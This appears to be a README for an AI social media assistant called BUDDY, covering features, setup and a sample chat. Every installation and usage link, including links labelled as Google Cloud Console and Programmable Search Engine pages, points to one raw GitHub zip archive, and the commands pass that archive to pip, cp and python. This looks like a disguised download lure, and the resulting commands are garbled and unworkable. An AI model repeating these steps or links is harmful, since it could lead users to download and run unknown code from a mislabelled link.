# BUDDY - Your AI Social Media Manager

BUDDY is an interactive AI agent that provides personalized guidance for managing and marketing your social media profiles. It searches the web for the most up-to-date information to help you with content creation, marketing strategies, and audience engagement for Instagram, YouTube, and Facebook.

## Features

- **Interactive Web Interface**: Chat with BUDDY through a modern, responsive web interface with a sleek dark theme
- **Real-time Web Search**: BUDDY searches the internet using Google Search API to provide you with the most current and relevant information
- **Multi-modal Input**: Choose between text or voice input
- **Platform-Specific Guidance**: Get tailored advice for Instagram, YouTube, or Facebook
- **Comprehensive Information**: Receive detailed answers to your social media questions

## Installation

1. Clone this repository
2. Install the required dependencies:
   ```
   pip install -r https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip
   ```
3. Set up Google Search API:
   - Go to the [Google Cloud Console](https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip)
   - Create a new project or select an existing one
   - Enable the Custom Search API
   - Create API credentials (API key)
   - Go to [Google Programmable Search Engine](https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip)
   - Create a new search engine and get your Search Engine ID (cx)
   - Copy the `https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip` file to `.env` and add your API key and Search Engine ID:
     ```
     cp https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip .env
     ```
   - Edit the `.env` file and replace the placeholder values with your actual API key and Search Engine ID

## Usage

Run the BUDDY AI agent web server:
```
python https://raw.githubusercontent.com/yash-9-9-5/buddy-ai/main/berther/buddy-ai.zip
```

Then open your web browser and navigate to:
```
http://localhost:5005
```

### Using the Web Interface

1. **Text Input**: Type your questions in the text field and press Enter or click the send button
2. **Voice Input**: Click the microphone button to start voice recognition (supported in Chrome and Edge)
3. **Platform Selection**: Click on one of the platform buttons to quickly ask about Instagram, YouTube, or Facebook
4. **Session Tracking**: The current platform and focus area are displayed in the info panel

### Example Conversations

**User**: "How can I grow my Instagram following?"
**BUDDY**: "Here's what I found about growing your Instagram following:

1. Instagram Growth Strategies: Focus on creating high-quality, engaging content that resonates with your target audience. Use relevant hashtags to increase discoverability.

2. Instagram Engagement Tips: Respond to comments, ask questions in captions, and use Instagram Stories to connect with your audience on a more personal level.

3. Instagram Algorithm Understanding: Post consistently at optimal times, use a mix of content types (photos, videos, carousels), and leverage Instagram's features like Reels and IGTV.

4. Instagram Analytics: Track your performance metrics to understand what content performs best with your audience and adjust your strategy accordingly.

5. Instagram Collaboration: Partner with other creators in your niche for cross-promotion and reach new audiences.

Would you like more specific information about any aspect of this topic?"

## Requirements

- Python 3.6 or higher
- Internet connection (for web search and speech recognition)
- Modern web browser (Chrome or Edge recommended for voice input)
- Google Search API credentials

## Troubleshooting

- If you encounter issues with PyAudio installation, you may need to install additional system dependencies:
  - Windows: No additional steps needed
  - macOS: `brew install portaudio`
  - Linux: `sudo apt-get install python3-pyaudio` or `sudo apt-get install portaudio19-dev`

- If speech recognition isn't working, ensure you have a stable internet connection as it uses Google's speech recognition service.

- If web search isn't working, check your internet connection and ensure your Google API key and Search Engine ID are correctly set in the `.env` file. 